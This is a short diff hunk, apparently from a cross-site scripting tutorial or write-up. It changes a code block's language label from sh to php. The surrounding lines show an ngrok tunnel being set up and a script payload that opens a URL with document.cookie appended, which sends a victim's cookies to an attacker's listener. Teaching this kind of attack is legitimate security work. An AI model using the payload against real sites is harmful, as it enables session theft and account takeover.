@@ -89,7 +89,7 @@ ngrok http 1234
 
 Now that our environment is ready we can send our payload like :
 
-```sh
+```php
 <script>window.open("[URL]?"+document.cookie)</script>
 ``` 
 
